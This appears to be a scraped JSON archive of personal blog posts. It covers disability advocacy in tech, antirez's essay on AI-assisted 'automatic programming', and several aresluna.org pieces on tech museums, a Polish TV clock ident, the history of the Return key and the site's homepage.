kind of ruins things for everyone. (The episode is still up on Spotify and Apple Podcasts.)  We had on Emily Ladau of The Accessible Stall podcast, Alex Haagaard of The Disabled List, and Vilissa Thompson of Ramp Your Voice. It\u2019s well worth a listen, and Emily, Alex and Vilissa really do an amazing job of pointing to really specific, really evocative examples of obvious places where today\u2019s tech world could be so much more useful and powerful for everyone if its creators were making just a few simple changes.</p>\\n<p>What\u2019s striking to me now, listening to that conversation six years later, is how little has changed from the perspective of the technology world, but also how much my own lived experience has come to reflect so much of what I learned in those conversations.</p>\\n<p>Each of them was the \"us\" in the conversation, using their own personal experience, and the experience of other disabled people that they were in community with, to offer specific and personal insights that the creators of these technologies did not have. And whether it was for reasons of crass commercial opportunism \u2014 here\\'s some money you could be making! \u2014\\xa0or simply because it was the right thing to do morally, it\\'s obvious that the people making these technologies could benefit by honoring the principle of centering these users of their products.</p>\\nTaking our turn\\n<p>I\u2019ve had this conversation on various social media channels in a number of ways over the years, but another key part of understanding the \u201cus\u201d in \u201cnothing about us without us\u201d when it comes to disability, is that the \u201cus\u201d is all of us, in time. It\\'s very hard for many people who haven\u2019t experienced it to understand that everyone should be accommodated and supported, because everyone is disabled; it\u2019s only a question of when and for how long.</p>\\n<p>In contemporary society, we\u2019re given all kinds of justifications for why we can\u2019t support everyone\u2019s needs, but so much of those are really grounded in simply trying to convince ourselves that a disabled person is someone else, an \u201cother\u201d who isn\u2019t worthy or deserving of our support. I think deep down, everyone knows better. It\u2019s just that people who don\u2019t (yet) identify as disabled don\u2019t really talk about it very much.</p>\\n<p>In reality, we\\'ll all be disabled. Maybe you\\'re in a moment of respite from it, or in that brief window before the truth of the inevitability of it has been revealed to you (sorry, spoiler warning!), but it\\'s true for all of us \u2014\\xa0even when it\\'s not visible. That means all of us have to default to supporting and uplifting and empowering the people who are disabled today. This was the key lesson that I didn\u2019t really get personally until I started listening to those who were versed in the history and culture of disability advocacy, about how the patronizing solutions were often harmful, or competing for resources with the right answers.</p>\\n<p>I\u2019ve had my glimpses of this myself. Back in 2021, I had Lyme disease. I didn\u2019t get it as bad as some, but it did leave me physically and mentally unable to function as I had been used to, for several months. I had some frame of reference for physical weakness; I could roughly compare it to a bad illness like the flu, even if it wasn\u2019t exactly the same. But a diminished mental capacity was unlike anything I had ever experienced before, and was profoundly unsettling, deeply challenging my sense of self. After the incident I\u2019d described in 2022, I had a series of things to recover from physically and mentally that also presented a significant challenge, but were especially tough because so much of people\u2019s willingness to accommodate others is based on any disability being visible. Anything that\u2019s not immediately perceived at a superficial level, or legible to a stranger in a way that\u2019s familiar to them, is generally dismissed or seen as invalid for support.</p>\\n<p>I point all of this out not to claim that I fully understand the experience of those who live with truly serious disabilities, or to act as if I know what it\u2019s been like for those who have genuinely worked to advocate for disabled people. Instead, I think it can often be useful to show how porous the boundary is between people who don\u2019t think of themselves as disabled and those who already know that they are. And of course this does not mean that people who aren\\'t currently disabled can speak on behalf of those who are \u2014 that\\'s the whole point of \"nothing about us without us\"! \u2014\\xa0but rather to point out that the time to begin building your empathy and solidarity is now, not when you suddenly have the realization that you\\'re part of the community.</p>\\nEverything about us\\n<p>There\u2019s a righteous rage that underlies the cry of \u201cnothing about us without us\u201d, stemming from so many attempts to address the needs of disabled people having come from those outside the community, arriving with plans that ranged from inept to evil. We\u2019re in a moment when the authoritarians in charge in so much of the world are pushing openly-eugenicist agendas that will target disabled people first amongst the many vulnerable populations that they\u2019ll attempt to attack. Challenging economic times like the one we\u2019re in affect disabled people significantly harder as the job market disproportionately shrinks in opportunities for the disabled first.</p>\\n<p>So it\u2019s going to take all of us standing in solidarity to ensure that the necessary advocacy and support are in place for what promises to be an extraordinarily difficult moment. But I take some solace and inspiration from the fact that there are so many disabled people who have provided us with the clear guidance and leadership we need to navigate this moment. And there is simple guidance we can follow when doing so to ensure that we\u2019re centering the right leaders, by listening to those who said, \u201cnothing about us without us.\u201d</p>'}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:41:11</p>"},{"location":"antirez.com/","title":"antirez.com","text":"<p>\u4ee5\u4e0b\u662f\u672c\u535a\u5ba2\u7684\u6240\u6709\u6587\u7ae0\uff1a</p> <ul> <li>Automatic programming 20260131</li> </ul> <p>\u672c\u535a\u5ba2\u6587\u7ae0\u7531 OpenClaw \u81ea\u52a8\u6293\u53d6</p>"},{"location":"antirez.com/Automatic%20programming_20260131/","title":"Automatic programming","text":"<p>\u6765\u6e90: antirez.com \u53d1\u5e03\u65f6\u95f4: Sat, 31 Jan 2026 10:25:27 +0100 \u94fe\u63a5: http://antirez.com/news/159</p> <p>In my YouTube channel, for some time now I started to refer to the process of writing software using AI assistance (soon to become just \"the process of writing software\", I believe) with the term \"Automatic Programming\".  In case you didn't notice, automatic programming produces vastly different results with the same LLMs depending on the human that is guiding the process with their intuition, design, continuous steering and idea of software.  Please, stop saying \"Claude vibe coded this software for me\". Vibe coding is the process of generating software using AI without being part of the process at all. You describe what you want in very general terms, and the LLM will produce whatever happens to be the first idea/design/code it would spontaneously, given the training, the specific sampling that happened to dominate in that run, and so forth. The vibe coder will, at most, report things not working or not in line with what they expected.  When the process is actual software production where you know what is going on, remember: it is the software you are producing. Moreover remember that the pre-training data, while not the only part where the LLM learns (RL has its big weight) was produced by humans, so we are not appropriating something else. We can pretend AI generated code is \"ours\", we have the right to do so. Pre-training is, actually, our collective gift that allows many individuals to do things they could otherwise never do, like if we are now linked in a collective mind, in a certain way.  That said, if vibe coding is the process of producing software without much understanding of what is going on (which has a place, and democratizes software production, so it is totally ok with me), automatic programming is the process of producing software that attempts to be high quality and strictly following the producer's vision of the software (this vision is multi-level: can go from how to do, exactly, certain things, at a higher level, to stepping in and tell the AI how to write a certain function), with the help of AI assistance. Also a fundamental part of the process is, of course, what to do.  I'm a programmer, and I use automatic programming. The code I generate in this way is mine. My code, my output, my production. I, and you, can be proud.  If you are not completely convinced, think to Redis. In Redis there is not much technical novelty, especially at its start it was just a sum of basic data structures and networking code that every competent system programmer could write. So, why it became a very useful piece of software? Because of the ideas and visions it contained.  Programming is now automatic, vision is not (yet). Comments</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:41:00</p>"},{"location":"aresluna.org/","title":"aresluna.org","text":"<p>\u4ee5\u4e0b\u662f\u672c\u535a\u5ba2\u7684\u6240\u6709\u6587\u7ae0\uff1a</p> <ul> <li>Fav tech museums</li> <li>The Clock</li> <li>The day Return became Enter</li> <li>The new homepage</li> <li>The primitive tortureboard</li> </ul> <p>\u672c\u535a\u5ba2\u6587\u7ae0\u7531 OpenClaw \u81ea\u52a8\u6293\u53d6</p>"},{"location":"aresluna.org/Fav%20tech%20museums/","title":"Fav tech museums","text":"<p>\u6765\u6e90: aresluna.org \u53d1\u5e03\u65f6\u95f4: \u94fe\u63a5: https://aresluna.org/fav-tech-museums</p> <p>Fav tech museums I love technology history because it brings me both advice and encouragement: stories of people solving problems despite constraints much bigger than mine, stories of flawed inventions and flawed inventors, stories of oddities that can inform and inspire. Sometimes the blueprints for the best version of the future already exist in the past, but only if you do some spelunking first, and remixing second. Those who read history will be able to repeat it, but under better circumstances, or more stellar execution. Technology history means visiting tech museums, and I have been doing that for decades now. I wanted to reflect on why I love some of them more than the others, so I made this photo essay: six best tech museums I\u2019ve been to, 16 great ones\u2026 and, at the end, three not-as-positive examples. I wrote it mostly for myself to think about what museums mean for me and what makes for the best museum experiences, but perhaps you will find something in it, too. I liked more museums than presented here, of course. And I have a lot more to visit (please let me know if you have suggestions!). But of the ones I have been to, these are the ones that deserve a spotlight. The best tech museums that I\u2019ve been to National Railway Museum Park /\u00a0Taipei\u00a0Railway Workshop Taiwan (the site near Songshan Park)\u00a0/\u00a0Visited in 2025 / nrm.gov.tw This place blew me away. It\u2019s a newish museum, but hosted in an old, massive railway workshop building complex, so you know the space itself is going to be part of the story \u2013 locomotives, huge industrial cranes that lift them around, various bits and pieces of preserved machinery. I generally love this kind of a vibe (even the smell of it all) and find it, in a way, breathtaking. Part of me would choose to live here in an instant. But, there are more things that make this museum special. A snippet of one of the videos The production value is impeccable and it seems to be spent on things that matter. For example, there are absolutely magnificent videos here of men restoring old locomotives, presented on big vertical displays. They\u2019re transfixing, almost pornographic. But they still feel made by someone who cares about this stuff and wants to show it well, and not just show it off . The landmark exhibit here is a multimedia piece with a huge transparent screen occasionally moving by an important locomotive, showing its innards. It\u2019s a lavish, impressive animation, with huge thumping bass and 3D renders\u2026 maybe a bit too cinematic, but again: it feels like it\u2019s coming from the right place. Trains are amazing and underrated, and they deserve awe. Generally, there\u2019s a lot of pride around here, and it feels like the right flavor of pride. In many exhibits, one can sense how people care about restoring the old machines and telling their stories, how the railways mattered to Taiwan, how important this preservation of history as a concept is to people here. Flanking the big building with amazing sightlines are some smaller, more traditional exhibits. The focus seems to be a bit more on the cultural aspects of railways, and less on the tech side. I learned so much from it all. Overall, it\u2019s a fantastic blend of old and new, with thoughtful details. It\u2019s big and inspiring enough I came back again a week later. There are many other disused buildings around the refurbished one that haven\u2019t been touched yet, and I understand the aspiration is to turn it into almost a park of sorts. I hope I\u2019ll be back to check out how they\u2019re doing. In a few rooms that have vintage phones as part of showing old offices or ticket booths, those phones occasionally ring. I found that so delightful. Museu de la T\u00e8cnica de\u00a0l\u2019Empord\u00e0 Figueres, Spain\u00a0/\u00a0Visited in 2016 and 2022 / mte.cat This was perhaps my best museum experience ever \u2013 the right thing at the right time in an unexpected place and with unexpected intensity. This thread captured the story, and I reflected upon it later here . So yeah, I\u2019m biased, but the reasons for that bias are worth celebrating. This museum definitely belongs to the joint category of \u201cgreat collection\u201d + \u201cgreat passion,\u201d with so many typewriters you could sometimes even pause and trace the history of individual manufacturer, as all of their models are shown side by side like on a timeline. There\u2019s also something I always appreciate: the ephemera. It\u2019s not just typewriters, but also the desks, the accessories, the advertisements, the complementary devices.            There is a risk of a museum doing that kind of stuff in a way that feels like hoarding and I don\u2019t fully understand yet what separates one from the other. This museum is not an extreme time capsule like other museums can be, but I find the ephemera crucial to understanding the machines. Nothing, after all, is used in isolation, and no device can be removed from the context of its time and its surroundings. I quip sometimes that the only difference between collecting and hoarding are the stories. I\u2019m also very happy I got to briefly meet the creator of the museum (and his whole family) before his passing. ACMI Melbourne\u00a0/\u00a0Visited in 2024 / acmi.net.au My photos won\u2019t do ACMI justice. This is an extremely well-made museum, filled with great experiences and stories. Every exhibit here drips with creativity, from simple ideas like splitting a car in half with two well-placed mirrors, or miniatures of TV rooms held inside actual TVs. There are probably fifty great little details here that will make you happy even if you don\u2019t notice them, and are a proof that a museum is so much more than its collection. Even the applications of technology are wonderful and exemplary. This isn\u2019t a museum where you\u2019d encounter a piece of paper saying \u201cunder maintenance\u201d slapped atop a stock Android tablet. For example, there is one exhibit here where you can edit a video by moving wooden blocks: Upon entry, you get a cool artifact resembling a View-Master reel where you \u201ccollect\u201d interesting information by tapping on things; most museums would screw this up somehow, and here it works flawlessly and the interactions are delightful. It feels the way we want tech to be \u2013  serving and enhancing, integrated, reliable, in the background. ACMI\u2019s Lens in use: \u201ccollecting\u201d artifacts, and at a meta exhibit where you can see connections between things you collected You can tell the museum is run by a designer! This is all really creative and endlessly inspiring. Top of my list. My strict travel plans meant I only visited once, and I regret it, as\u00a0I feel I only scratched the surface. Computer\u00adspiele\u00admuseum /\u00a0Computer\u00a0Game Museum Berlin\u00a0/\u00a0Visited in 2018 / computerspielemuseum.de This museum punches above its weight. Most videogame museums I\u2019ve seen are vehicles for hollow nostalgia, arcades by a different name. But Berlin\u2019s Computer Game Museum has more depth and tries to do the art and history of videogames justice. There is a little arcade here, for sure, even styled appropriately and with a cute list of highscores. There are also a few nicely recreated \u201cteenager\u201d rooms matching different decades. But there are also rare prototypes of local games (like the East Germany\u2019s Poly-Play ), and some art pieces like PainStation , ROM CHECK FAIL , and the world\u2019s worst Pac-Man made even worse by attaching it to a comically oversized Atari joystick (shoes off!). The selection of games continues to be surprising elsewhere: Would you expect to see Stanley Parable here? Or ELIZA? The design of the place is also interesting. There\u2019s always something around the corner that catches your attention, sometimes with the rooms and machines complimenting each other visually. This museum made me think. Really nicely done. I wrote a thread on social if you are curious to learn a bit more. Bonami Spel\u00adComputer Museum Zwolle, The Netherlands\u00a0/\u00a0Visited in 2022 / computermuseum.nl In the 2000s, the Computer History Museum \u2019s then-new location had an interim state called The Visible Storage: raw shelves, filled with computers. There were some plaques, but most stories came from volunteer docents (I eventually became one of them) running the show. The Dutch Bonami museum is that, except there are no docents. Oh, and the whole place is massive . I have never seen this many microcomputers under one roof. Not even close. I think there must be thousands of computers here, and it\u2019s funny how just the scale alone elevates the museum. Without that scale, there would be so much room for improvement. Turn on more of these computers so you can play with them (currently, only a scant few are allowed this). Tell better stories. Add production value. But turns out, sometimes scale is enough. Enter Bonami and you feel awash in microcomputers, surrounded by what feels like the entirety of the 1980s and the 1990s. You can compare small differences between models, ponder design details, find obscure machines you didn\u2019t know existed. It\u2019s worth checking it out to see how this amount of computers makes you feel. Home\u00adComputer\u00adMuseum Helmond, The Netherlands\u00a0/\u00a0Visited in 2022 / homecomputermuseum.nl Perhaps an apotheosis of a certain kind of a computer museum: all microcomputers, some turned on, catering to nostalgia for the 1980s and 1990s. There\u2019s nothing bad about this approach, but many places do that and after a while it all feels kind of same\u2019y. Not here. Many of the machines here are in working condition and ready to play, which is already very nice. And there will be a few surprises: restoring a Dutch graphics computer Aesthedes with an impressive island of a keyboard , a few Dutch machines like the distinctively shaped Holborn and Eindhoven\u2019s CHE-1, or a \u201ctime machine\u201d 1990 Tulip computer that allows you to browse the internet like it appeared decades ago. The design and decor are slightly better than elsewhere, too, with various thematic displays, and an open, welcoming feel \u2013 and generally it feels the museum is cared for in a way many are not. The tragically-and-inexplicably-shuttered Seattle museu</p> <p>... (\u5185\u5bb9\u5df2\u622a\u65ad)</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:41:12</p>"},{"location":"aresluna.org/The%20Clock/","title":"The Clock","text":"<p>\u6765\u6e90: aresluna.org \u53d1\u5e03\u65f6\u95f4: \u94fe\u63a5: https://aresluna.org/the-clock</p> <p>The Clock Of my childhood, I vividly remember The Clock. Polish state television had then but two sorry channels, so there was little actual competition. Although it would soon be gone , communism meant scant advertising. And TV in general wasn\u2019t nearly as precious about on-air saturation as it is today \u2014 meaning there were no multiple commercial breaks, no ads for future programs infringing on current programs, and no end credits sped up spastically to make room for the next item on the breathless, never-to-be-halted schedule. My childhood TV had none of those things. In Poland, in the 1980s, the dead space in between programs was filled with\u2026 a clock. Or, to me, The Clock. This was still before the digital age, so The Clock must have been put together by hand, hung on one of the walls of the television headquarters at Jana Paw\u0142a Woronicza Street in Warsaw, and assigned the saddest of cameras which permanently, year after year, kept pointing at its face. It was a minimalistic clock, with three off-white hands, and \u2014 for today\u2019s standards \u2014 an oddly small Telewizja Polska logo. The background was dark blue. There were no sound effects or music. Recently, I learned this is what insiders call \u201ca clock ident.\u201d Clock idents were popular in other countries in Europe and Asia , and still exist in random pockets of our planet as an odd, half-forgotten tradition, similar to striking clocks mounted in towers. There\u2019s something calming, almost meditative, imagining it being broadcast to millions of people at the same time; it ties neatly into the queue reality of countries in similar situation to Poland. Recordings of clock idents from Japan , Russia , Australia , Chile , Denmark (don\u2019t forget the fish!), and Czechoslovakia I didn\u2019t have any of that context then. Back then, I simply loved The Clock to death. Not for what it was, of course (time-telling was provided by our own wall clock that didn\u2019t require aerials and cathode ray tubes \u2014 and later on, a prized Casio electronic watch on my wrist). Like Pavlov\u2019s dogs, I loved The Clock for what it promised . I would stare at it just minutes before new adventures of Crockett and Tubbs . I would twiddle my thumbs in anticipation of the resolution to last week\u2019s Crime Story \u2014 or, in the years before I was allowed to watch those series, another episode of a Polish, Czech, or Russian cartoon. The Clock was not unlike that Universal Studios globe , a reliable entry gate to a new grand adventure, but one that didn\u2019t require an expensive trip to the movie theatre. It was right there, in my home. I remembered The Clock in 2015 as I was preparing a San Francisco event where I subtitled a vintage Polish TV show and showed it to my friends. And, of course, always at the ready for idiosyncratic long-tail interests, YouTube had a video of a VHS recording of The Clock , complete with that annoying beeping message meant to wake you up to turn off your TV after the programs ended (again, weird on so many levels today). So, just as I sometimes do with other artifacts of my youth, I recreated The Clock in JavaScript. And I had a little d\u00e9j\u00e0 vu: I remember having programmed a version of that clock once already, on an early computer of mine. I wish it was possible for that me, from 25 years ago, and me from 2 weeks ago, to have a conversation: programmer to programmer, one of us deliberately tapping into nostalgia and skeuomorphism, one of us simply believing in magic and trying to summon it by whichever means possible. (Although perhaps that encounter would end just as badly as this experiment .) In the years since I pieced together a few details. After seeing almost exactly the same clock in Japan in 2018 \u2013 in a physical form \u2013 I realized the TVP clock must have been imported from there. The Polish TV clock wasn\u2019t really Polish! And recently, I learned at least one person recreated a host of beautiful BBC clock idents the same way. But the YouTube videos and the new discoveries don\u2019t intrude on my little fantasy. So, check out that clock recreation above or below. To many of you it might mean very little. To some, it will bring back memories. And if you\u2019re like me, you will remember that little delay between the second hand hitting a full-minute mark, and the operator starting the playback of whatever was supposed to go on air. That blink of an 1980s eye, filled with excitement and anticipation, will too be your favourite nerdy childhood moment, one you never knew you so appreciated. This is a JavaScript clock and should be showing your current time. You can open it as a standalone thing .</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:41:13</p>"},{"location":"aresluna.org/The%20day%20Return%20became%20Enter/","title":"The day Return became Enter","text":"<p>\u6765\u6e90: aresluna.org \u53d1\u5e03\u65f6\u95f4: \u94fe\u63a5: https://aresluna.org/the-day-return-became-enter</p> <p>The day Return became Enter In the popular imagination, the transition from the world of typewriters to the universe of computers was orderly and simple: at some point in the 20th century, someone attached a CPU and a screen to a typewriter, and that turned it into a computer. But the reality is much more fascinating and convoluted. The transition was meandering and lengthy, and traces of its many battles and decisions remain scattered across keyboards today. And no key might better represent the complexity of that journey than the Return key. Return and Enter keys on a AT&amp;T keyboard, and a carriage return on a typewriter An assembly line of typewriters under construction at the Underwood plant in 1962, with the carriage return levers clearly visible Typewriters, born in the 1870s, did not understand information, and didn\u2019t care about the meaning of their output. Early models lacked 0 and 1 keys for cost cutting reasons. You were supposed to type a capital O or a lowercase l instead \u2013\u00a0they looked just about good enough. Teachers and tutorials encouraged you to overprint to create missing characters: type I on top of S to get a dollar sign, for example, or even reach for a pencil to fill in a missing part if overtyping wasn\u2019t good enough. In theory, you could go even further: nothing prevented you from grabbing a typewritten page, putting it back upside down, and typing on top of what you wrote before. This technique added to the repertoire of an art form known as \u201cconcrete poetry.\u201d In that universe, a carriage return \u2013 that distinctive lever on the left-hand side of each typewriter \u2013 was a kind of mechanical shorthand. It advanced the paper by a line or two, and returned the carriage to the left margin, winding it for the next line. You could carry out those two functions separately, but even early typewriter manufacturers realized the operation needed a better, joint interface. An evolution of the carriage return lever: from 1901 to the 1950s The carriage return lever was similar to all the other mechanical functions of the typewriter, starting as simple as humanly (and inhumanly) possible. Tab added a few spaces or mechanically zipped the carriage to the next predetermined point. The Shift key moved the carriage up or the key basket down, applying its simple operation to every key equally. Shift Lock was a literal tooth holding Shift in place, placed right next to it for manufacturing convenience first, and ergonomics a distant second. It affected letters, digits, and punctuation in equal measure, in contrast to the later Caps Lock . Improperly set up tabs could damage the typewriter as the entire energy of the line was released immediately. In later typewriters, a tab brake that remedied the problem became a standard feature. A demonstration station for a Burroughs typewriter with an electric carriage return, 1936 Some of these special keys started as levers or even, like Tab , first-party or third-party additions bolted onto your typewriter. In time, all these functions migrated to the keyboard, making them easier to reach and more consistent in their operation. But carriage return remained the one holdover, too mechanically complex to follow in the other functions\u2019 footsteps. It was only when typewriters embraced electricity in the 1940s and 1950s that the carriage return completed its transformation into a key, and the distinctive lever could be detached. The key was most often called Carriage Return or Return , as expected. But since introducing electricity made the carriage return so much easier to operate, it was no surprise that the industry that once brought you Floating Shift and Magic Margin keys also saw some typewriter manufacturers calling their keys Electric Return or even Power Return , like doors in your shiny new Detroit-made car. The most popular electric typewriter in history, the IBM Selectric, called it \u201ccarrier return\u201d in the user manual \u2013\u00a0the carriage was stationary, and the font ball was carried across it \u2013 but the keyboard itself went with a simple Return . In the 1960s, an experiment estimated that switching to an electric typewriter made regular typing 18 times easier on average. Pressing the spacebar required only about half the work on an electric, since it was already pretty easy on a mechanical typewriter. Backspace needed 12 times less effort on an electric typewriter, and Shift 9 times. But the introduction of the Carriage Return key was measured to be an astonishing 425 times easier on people\u2019s fingers. In an interesting reversal of the early days of carriage returns, cheaper models of Smith-Corona typewriters from the 1970s came with most functions electrified except for the carriage return, negative space for the key appearing on the keyboard, and the lever still attached in a typical space. Note one typewriter using the early Dvorak layout, including reordered digits. But there were other keyboards that embraced electricity even earlier without bragging about it. Those were the keyboards of teletypes, taught to send text across wires (\u201cteletype\u201d derived from \u201cteletypewriter,\u201d or \u201cremote typewriter\u201d) at a constant speed of a little over 6 characters per second. Teletypes formed pre-internet information networks, used by news agencies, postal offices, railroads, and other big companies and institutions. They were a successor to Morse code, abandoning its iconic single key that was pressed repeatedly to create streams of dihs and dahs. What replaced a Morse code lever was, at first, the five-key Baud\u00f4t keyboard, and then a standard typewriter-like QWERTY keyboard, the general public\u2019s familiarity with which ensured less training was required. Using a QWERTY keyboard meant the machines had to be tasked with encoding. Every key was assigned a number from 0 to 31. Space was zero, A was 3, B was 25, C was 14, and so on \u2013\u00a0teletypes knew how to encode all of the characters being typed in, and how to decode them on the other side. This was an approach later built on by ASCII in the 1960s (encoding 128 numbers) and Unicode in the 1990s (encoding 150 thousand at the time of writing). But for proper operation, it wasn\u2019t just letters and digits that needed to be transmitted. Everything else \u2013 spaces, backspaces, jumping to a new line \u2013 also had to travel across the wire, to make sure the reconstructed message matched the input like a carbon copy would. Those extra pieces of information were eventually named \u201ccontrol characters,\u201d and assigned their own codes. But there was a problem. Typing a letter, moving back, and advancing paper took relatively little time. However, zipping the carriage from the right side of the page to the left was slower. That created a challenge: since teletypes communicated at a constant rate, the first letter arriving after a longer line could be smeared across the page, as the carriage return was still in progress. Just as with early typewriters, any \u201csmart\u201d solution would be prohibitively complicated or expensive to make. But what if the character following a carriage return was guaranteed to be non-printing? This would give the teletype a chance to catch up. And so teletypes undid the early convenience of typewriters, and Carriage Return became decoupled from Line Feed . The former key moved the carriage to the left, but stayed on the same line. The latter advanced the paper to the next line, with no horizontal movement. Sometimes, the Line Feed code would arrive after a carriage return was complete. Other times, it would come in the middle of the carriage returning, but the teletype could deal with those movements coexisting. This is the origin of the CR/LF debacle that\u2019s still an occasional problem for today\u2019s programmers. The responsibility now rested on a typist to press these two keys every time, and in that particular order. This was a solution to a weird challenge that was both smart and dumb \u2013 and it was the first, but far from the last, complication around Return . In another corner of the typing universe, the word-processing revolution was brewing. Early word processors \u2013 back when that phrase meant hardware, not software \u2013 were nothing more than automated typewriters, teletypes without wires. But they focused on solving a slightly different issue: not one of exchange of information, but one of copying and rewriting. The first word processors allowed people to \u201csave\u201d a page\u2019s worth of keystrokes that could later be replayed. The letters were initially stored on hole-filled cards \u2013 not dissimilar to player pianos \u2013 and later captured onto magnetic media. The automatic repetition had two huge benefits: You could create carbon copies that were of the same quality, and you could also create personalized advertising letters, ones that looked as if they were typed just for the recipient. After mastering that, the inventors of word processors moved on to the next, even bigger challenge. With typewriters, making a single typo or having a belated desire to change anything usually meant throwing out what one had typed so far and retyping the page from the beginning. But what if new technology allowed you to freely modify the saved text? Would it be possible to replace one word with another? Or delete a word? Or insert a sentence? There were many, many problems to solve here: storage, logic, user interface. One of them? The na\u00efve carriage return struggled to find its place in the world of word processing. What was necessary was text reflow : automatically adjusting the text and inserting carriage returns (or even hyphenating) whenever a word was about to go past the right margin. And then revisiting those breaks the moment anything was changed, inserted, or deleted. This eventually led to the Insert key, originally used to switch between old-school, typewriter-like overtyping, and the new shiny method of inserting text as you typed. The key was designed to help with a specific transition, and then did something few keys do: it disappeared from most keyboar</p> <p>... (\u5185\u5bb9\u5df2\u622a\u65ad)</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:41:16</p>"},{"location":"aresluna.org/The%20new%20homepage/","title":"The new homepage","text":"<p>\u6765\u6e90: aresluna.org \u53d1\u5e03\u65f6\u95f4: \u94fe\u63a5: https://aresluna.org/</p> <p>Ares luna Marcin Wichary Designer/Writer/Typographer You might know me from\u2026 My book about keyboards Finding a magical typewriter museum in Spain My photo essay about a font called Gorton A thread about 300 design details in Japan A talk about pixel fonts Putting Pac-Man on Google\u2019s homepage Perfecting link underlines on Medium Tech and design history The hardest working font in Manhattan A 150-year-old font you have never heard of \u2013 and one you probably saw earlier today Frame of preference A story of early Mac settings told by 10 emulators Charles Babbage\u2019s mouse pointer A tour of some early user interfaces one never hears about Fav tech museums A photo essay of 20-something best tech museums I\u2019ve been to\u2026 and three bad ones Hypertalking Mac collection A photo essay of checking out a cool Apple Macintosh collection Berlin Videogame Museum A report from a surprisingly great museum The Clock In the 1980s, the dead space between our television programs was filled with\u2026 a clock Dutch computer museums Photos from three very different computer museums in the Netherlands GUIdebook My old site about the history of graphical user interfaces The curious life and the prolonged death of\u00a0IBM\u00a0AN/FSQ-7 A quick Ignite talk about a fascinating Cold War computer When screens were expensive On early computers that couldn\u2019t afford all the pixels 6 more Keyboards Shift Happens A site for my book about keyboards, filled with minigames Typewriter simulator Get to know a manual typewriter and all its forgotten nooks and crannies The abridged history of having fun with keyboards A talk about creative uses of keyboards across the ages The primitive tortureboard Untangling the myths and mysteries of Dvorak and QWERTY 50 keyboards from my collection The most interesting keyboards I ever acquired Cover stories A little game/explainer for the cover of the book Shift Happens book thread A five-year-long thread of making of my first book The day Return became Enter A deep dive into the convoluted and fascinating story of one of the most important keys on the keyboard Steve Jobs, Jef Raskin, and the first great war for your thumbs On some brilliant, idiosyncratic, and often ill-fated gambits to transform computer input Shift + Shift On motor memories and actual memories The modifiers and the keepers Searching for the largest keyboard ever made The soul of an old solenoid On a surprising connection between keyboards and pinball machines 7 more Typography / Essays &amp; talks The hardest working font in Manhattan A story of a 150-year-old font you have never heard of \u2013 and one you probably saw earlier today In defense of an old pixel On the surprising beauty and surprising relevance of pixel fonts I pressed \u2318B. You wouldn\u2019t believe what happened\u00a0next On what happens when you try to bold some text When fonts fall Everything you ever wanted to know about font fallback Getting to the bottom of line height in Figma Investigating the nature of web\u2019s leading A hack named Typit A fascinating scheme to get more letters on your keyboard System shock A story of a 25-year-old font coming back with a vengeance An ode to OpenType A love letter to OpenType features in fonts Perfecting link underlines on Medium How hard could it be to draw a horizontal line on the screen? Typography is impossible The practical guide to why laying out type never quite does what you want 5 more Typography / Interactive text.makeup A tool to debug strings and learn about Unicode Segmented type appreciation corner A little playground to mess with segmented fonts Typewriter simulator Get to know a manual typewriter and all its forgotten nooks and crannies Pixel fonts experiment A little pixel-to-vector font plaything / More explanation Bug &amp; detective stories A hacker\u2019s guide to bending the universe If you're going to conquer the world, you can't let a broken CRT monitor stand in your way System shock A story of a 25-year-old font coming back with a vengeance Dear Cynthia Chasing an author of a great photograph This is a story of a Figma bug that wasn\u2019t a\u00a0bug\u00a0at\u00a0all One keyboard decision backfiring decades later The curious case of the disappearing Polish S One keyboard bug three decades in the making To save a keyboard, pt. 1 Trying to confirm an existence of a rare 19th-century typewriter with a strange key I pressed \u2318B. You wouldn\u2019t believe what happened next On dealing with a bug that ended up being very different than expected 2 more Travelogues Toy company, my ass Trying to find a distinctive location from my favourite movie In the footsteps of Robert Moses Roadtripping across the bridges, highways, and parks of America\u2019s most controversial urban planner Fav tech museums A photo essay of 20-something best tech museums I\u2019ve been to\u2026 and three bad ones Japan design details A long thread about 300 design niceties and nuances in Japan Something magical happened to me today A serendipitous discovery of a mindblowing typewriter museum The best laid tracks Stories of ghost train stations in San Francisco A time machine behind the cypress trees On finding a place with all the keyboards Seesaws for giants Chasing Chicago\u2019s movable bridges 3 more UX design Designing Selection Colors Building and testing a little Figma feature I feel rather proud of Everyday design The usual and unusual challenges of designing the license support for Medium Charles Babbage\u2019s mouse pointer A tour of some early user interfaces one never hears about Dark theme in a day Using a bunch of modern CSS to create a night mode for an app Figma\u2019s new finger tips Redesigning Figma\u2019s keyboard panel with inspiration from Doug Engelbart You\u2019re a street designer (you just don\u2019t know it yet) The design principles behind Streetmix 2 more Urbanism Mr. Phelan\u2019s building A deep dive into San Francisco\u2019s most impressive flatiron Streetmix I was a founding designer of a fun little app to make street design available for everyone The other Golden Gate Bridges What The Golden Gate Bridge could\u2019ve been Click that \u2019hood A little neighborhood-guessing game I wrote while at Code For America Public speaking experiments Monochromatic An Ignite talk that changed room colors In defense of an old pixel A talk with audience participation The making of Four Laps I went mad during COVID lockdown and made a looping video about looping videos To walk among keyboard magicians Building an invisible remote and putting it\u2026 you won\u2019t ever guess where The wild presentation network for the Computer History Museum talk On creating a system to make the slides read off presenter\u2019s minds The cheapest invisible UI On creating a system to make the slides read off audience\u2019s minds The secrets of Google Pac-Man A web-based gameshow about Pac-Man Follow along and up A talk that follows up with you and sends more info about stuff you care about 3 more Print Moir\u00e9 no more Discovering a magical ancient algorithm to fix scanned photos Cover story, pt. 1 A beautiful almost-encounter with Donald Knuth How I learned to hate InDesign Putting InDesign to work and suffering One more prototype A story of Shift Happens in 11 prototypes The trip to Spain: The bad parts Losing an SSD drive and messing up my entire book in the most subtle of ways My experiences printing a small batch of books Comparing various online printing services 3 more Art &amp; personal stuff \u201cAlternatywy 4\u201d in America Bringing a TV show from my old home to my new one The last interview \u201cI have cancer. It\u2019s pretty bad. I can send you some stuff, but you will get it after I\u2019m gone.\u201d 1,110 notes On playing piano on repeat Party Where We Read Things Bring writing you like and read it Collateral A shooting in my apartment building Two syllables, or three On surrendering a sick cat Larry\u2019s Quest A pixellated meditation on life\u2019s nature 4 more 